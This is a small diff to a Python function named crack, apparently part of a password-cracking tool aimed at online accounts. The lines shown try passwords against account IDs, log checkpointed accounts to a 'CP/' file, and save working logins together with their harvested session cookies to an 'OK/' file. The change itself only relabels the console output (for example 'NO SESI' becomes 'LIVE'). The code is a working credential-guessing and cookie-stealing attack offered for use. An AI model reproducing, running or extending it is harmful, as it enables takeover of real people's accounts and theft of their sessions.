@@ -564,7 +564,7 @@ def crack(idf,pwv):
 					print('\n')
 					statuscp = f'[cp]  {idf} | {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='SESI'))
+					cetak(nel(statuscp1, title='CP/SESI'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -577,9 +577,9 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[OK] {idf}\n | {pw}'
+					statusok = f'[ID] {idf}\n[PW] {pw}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title=' NO SESI'))
+					cetak(nel(statusok1, title=' LIVE'))
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
